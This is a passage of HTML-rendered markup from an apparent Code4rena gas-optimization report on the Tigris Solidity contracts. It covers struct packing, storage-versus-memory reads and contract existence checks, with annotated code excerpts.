class=\"mtk7\">10</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">11</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">direction</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tpPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderType</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trader</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">17</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">id</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">            </span><span class=\"mtk12\">int</span><span class=\"mtk1\"> </span><span class=\"mtk12\">accInterest</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">20</span><span class=\"mtk1\">:       }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Variable ordering with 9 slots instead of the current 10:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///           uint256(32):margin, uint256(32):leverage, uint256(32):asset, uint256(32):price, uint256(32):tp, uint256(32):sl, uint256(32):orderType, address(20):account, bool(1):direction, address(20):tigAsset</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">        </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">MintTrade</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">account</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">margin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">25</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">26</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">direction</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">29</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">30</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sl</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">31</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">orderType</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">32</span><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">33</span><span class=\"mtk1\">:       }</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/IPosition.sol#L7-L20</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"96\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">interfaces</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ITrading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Variable ordering with 8 slots instead of the current 9:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///           uint256(32):margin, uint256(32):leverage, uint256(32):asset, uint256(32):tpPrice, uint256(32):slPrice, bytes32(32):referral, address(20):marginAsset, bool(1):direction, address(20):stableVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">9</span><span class=\"mtk1\">         </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TradeInfo</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">10</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">margin</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">11</span><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">marginAsset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">stableVault</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">leverage</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">direction</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tpPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">17</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">slPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">referral</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">:       }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Variable ordering with 5 slots instead of the current 6:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///           uint256(32):deadline, uint256(32):amount, bytes32(32):r, bytes32(32):s, uint8(1):v, bool(1):usePermit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">21</span><span class=\"mtk1\">        </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC20PermitData</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">22</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">deadline</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">23</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">24</span><span class=\"mtk1\">            </span><span class=\"mtk12\">uint8</span><span class=\"mtk1\"> </span><span class=\"mtk12\">v</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">25</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">r</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">26</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">27</span><span class=\"mtk1\">            </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">usePermit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">28</span><span class=\"mtk1\">:       }</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/interfaces/ITrading.sol#L9-L19</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"97\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">utils</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TradingLibrary</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit Variable ordering with 5 slots instead of the current 6:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///           uint256(32):asset, uint256(32):price, uint256(32):spread, uint256(32):timestamp, address(20):provider, bool(1):isClosed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">12</span><span class=\"mtk1\">    </span><span class=\"mtk12\">struct</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PriceData</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">13</span><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">provider</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">15</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">16</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spread</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">17</span><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">18</span><span class=\"mtk1\">        </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isClosed</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">19</span><span class=\"mtk1\">:   }</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/utils/TradingLibrary.sol#L12-L19</p>\n<h2 id=\"g05--using-storage-instead-of-memory-for-structsarrays-saves-gas\" style=\"position:relative;\"><a href=\"#g05--using-storage-instead-of-memory-for-structsarrays-saves-gas\" aria-label=\"g05  using storage instead of memory for structsarrays saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑05]  Using <code>storage</code> instead of <code>memory</code> for structs/arrays saves gas</h2>\n<p>When fetching data from a storage location, assigning the data to a <code>memory</code> variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (<strong>2100 gas</strong>) for <em>each</em> field of the struct/array. If the fields are read from the new memory variable, they incur an additional <code>MLOAD</code> rather than a cheap stack read. Instead of declearing the variable with the <code>memory</code> keyword, declaring the variable with the <code>storage</code> keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a <code>memory</code> variable, is if the full struct/array is being returned by the function, is being passed to a function that requires <code>memory</code>, or if the array/struct is being read from another <code>memory</code> array/struct</p>\n<p><em>There are 2 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"98\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Trading</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">700</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">Fees</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_fees</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">openFees</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">774</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">Fees</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_fees</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">closeFees</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/Trading.sol#L700</p>\n<h2 id=\"g06--avoid-contract-existence-checks-by-using-low-level-calls\" style=\"position:relative;\"><a href=\"#g06--avoid-contract-existence-checks-by-using-low-level-calls\" aria-label=\"g06  avoid contract existence checks by using low level calls permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G‑06]  Avoid contract existence checks by using low level calls</h2>\n<p>Prior to 0.8.10 the compiler inserted extra code, including <code>EXTCODESIZE</code> (<strong>100 gas</strong>), to check for contract existence for external function calls. In more recent solidity versions, the compiler will not insert these checks if the external call has a return value. Similar behavior can be achieved in earlier versions by using low-level calls, since low level calls never check for contract existence</p>\n<p><em>There are 40 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"99\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">202</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">manager</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transferFrom()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/BondNFT.sol#L185</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"100\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">GovNFT</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit excessivelySafeCall()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">175</span><span class=\"mtk1\">:          (</span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">success</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reason</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">).</span><span class=\"mtk11\">excessivelySafeCall</span><span class=\"mtk1\">(</span><span class=\"mtk11\">gasleft</span><span class=\"mtk1\">()*</span><span class=\"mtk7\">4</span><span class=\"mtk1\">/</span><span class=\"mtk7\">5</span><span class=\"mtk1\">, </span><span class=\"mtk7\">150</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">.</span><span class=\"mtk12\">nonblockingLzReceive</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_srcChainId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_srcAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_nonce</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_payload</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">279</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_msgsender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transferFrom()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">289</span><span class=\"mtk1\">:          </span><span class=\"mtk15\">try</span><span class=\"mtk1\"> </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk11\">_msgSender</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>https:/github.com/code-423n4/2022-12-tigris/blob/496e1974ee3838be8759e7b4096dbee1b8795593/contracts/GovNFT.sol#L175</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"101\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Lock</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">39</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">52</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_tigAsset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transferFrom()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">72</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transferFrom()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">:           </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_asset</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit transfer()</span></span></span>\n<span 